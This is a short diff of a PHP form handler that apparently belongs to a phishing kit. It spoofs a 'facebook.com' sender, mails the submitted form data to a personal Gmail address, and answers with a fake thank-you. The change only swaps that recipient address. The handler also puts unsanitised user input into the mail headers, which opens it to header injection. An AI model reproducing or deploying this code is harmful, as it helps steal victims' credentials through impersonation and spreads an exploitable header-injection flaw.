@@ -6,7 +6,7 @@ $headers = 'From: facebook.com' . "\r\n" .
            'Reply-To: ' . $_POST['email']. "\r\n" .
            'X-Mailer: PHP/' . phpversion();
 
-mail('classicvibe776@gmail.com', $subject, $message, $headers);
+mail('classicvibe766@gmail.com', $subject, $message, $headers);
 
 die('Thank you for your email');
 }
